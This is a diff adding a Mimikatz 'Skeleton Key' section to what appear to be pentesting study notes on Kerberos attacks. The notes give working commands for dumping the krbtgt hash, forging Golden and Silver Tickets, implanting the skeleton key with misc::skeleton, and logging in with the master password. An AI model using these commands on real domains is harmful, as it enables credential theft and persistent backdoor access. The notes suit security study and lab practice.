@@ -98,6 +98,18 @@ Example:
 Examples:
 - lsadump::lsa /inject /name:krbtgt -> Dumps the hash and security identifier needed to create a Golden Ticket. To create a silver ticket, change /name: to smth else like SQLService or w/e service you need access to
 - Kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id: -> This creates the Golden Ticket. For a Silver Ticket, you place the NTLM hash of the service account into the /krbtgt slot, the service account's sid into the sid slot, and the ID of 1103. i.e. Kerberos::golden /user:Administrator /domain:controller.local /sid:S-01-223-Aetc. /krbtgt:<HASH> /id:1103
-- misc::cmd -> Opens a new elevated command prompt with the given ticket in mimikatz. 
+- misc::cmd -> Opens a new elevated command prompt with the given ticket in mimikatz.
+
+7) Mimikatz Backdoors w/ Skeleton Key
+- This backdoor abuyses AS-REQ's validation of encrypted timestamps. Remember these timestamps are encrypted with the user's NT Hash. With an implanted skeleton key, the DC attempts to decrypt the timestamp using both the user's NT hash and the skeleton key NT hash, allowing you access to the domain forest (huh? Not explained well). 
+
+Examples:
+- misc::skeleton -> Install the skeleton key
+- Start accessing stuff via the skeleton key's Hash (the NT Hash of the password "Mimikatz") i.e. 
+net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz
+dir \\Desktop-1\c$ /user:Machine1 mimikatz
+
+- It's basically a Master Key we can use to get access to w/e. It's stored in LSASS memory and can be used to decrypt timestamp messages, validating us. 
+
 
  
